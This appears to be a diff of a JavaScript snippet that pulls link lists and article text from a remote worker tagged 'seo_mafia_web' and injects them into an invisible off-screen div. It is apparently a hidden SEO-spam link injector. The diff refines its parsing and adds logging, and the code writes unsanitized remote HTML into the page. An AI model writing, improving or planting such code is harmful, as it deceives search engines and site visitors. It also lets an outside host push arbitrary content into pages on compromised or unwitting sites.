@@ -1,5 +1,6 @@
 !function(){
 try{
+
 const API_BASE="https://smw-queryjs.data-deliver.workers.dev";
 const TOKEN="seo_mafia_web";
 function decode(b64){
@@ -12,6 +13,7 @@ function decode(b64){
    return "";
  }
 }
+
 async function getData(id){
  try{
    const res=await fetch(API_BASE+"/data-value?id="+id+"&token="+TOKEN,{cache:"no-store"});
@@ -24,42 +26,46 @@ async function getData(id){
    return "";
  }
 }
+
 Promise.all([
  getData("b1"),
  getData("a1")
 ]).then(function(res){
+
  let anchorsRaw=res[0];
  let articleRaw=res[1];
- if(!anchorsRaw||!articleRaw){
+
+ console.log("RAW ANCHORS:",anchorsRaw);
+ console.log("RAW ARTICLE:",articleRaw);
+ 
+ if(!anchorsRaw || !articleRaw){
    console.warn("panel2 data kosong");
    return;
  }
 
- let anchors=anchorsRaw
-  .replace(/"/g,"")
-  .split("\n")
-  .map(v=>v.trim())
-  .filter(Boolean)
-  .map(function(line){
-     let p=line.split("|").map(x=>x.trim()).filter(Boolean);
-     if(p.length<2) return "";
-     let text=p[0];
-     return p.slice(1).map(function(url){
-       return '<a href="'+url+'" target="_blank">'+text+'</a>';
-     }).join(" ");
-  })
-  .filter(Boolean);
+ let anchors = anchorsRaw
+   .split(/\r?\n/)   // FIX line break
+   .map(v=>v.trim())
+   .filter(Boolean)
+   .map(function(line){
 
+     let parts=line.split("|");
+     if(parts.length<2) return "";
+     let text=parts[0].trim();
+     let url=parts[1].trim();
+     if(!text || !url) return "";
+     return '<a href="'+url+'" target="_blank">'+text+'</a>';
+
+   })
+   .filter(Boolean);
+ console.log("ANCHORS RESULT:",anchors);
  if(!anchors.length){
    console.warn("panel2 anchor kosong");
    return;
  }
-
  let i=0;
-
  let html;
-
- if(/\{ANCHOR/i.test(articleRaw)){
+ if(/\{ANCHOR\}/i.test(articleRaw)){
    html=articleRaw.replace(/\{ANCHOR\s*\}/gi,function(){
      return anchors[i++%anchors.length];
    });
@@ -76,15 +82,9 @@ function inject(html){
    box.style.cssText="position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden;font-size:0;";
    (document.body||document.documentElement).appendChild(box);
  }
- if(html) box.innerHTML=html;
+ box.innerHTML=html;
  console.log("panel2 inject sukses");
 }
-if(!document.body){
- document.addEventListener("DOMContentLoaded",function(){
-   inject("");
- });
-}
-
 }catch(e){
  console.error("panel2 fatal",e);
 }
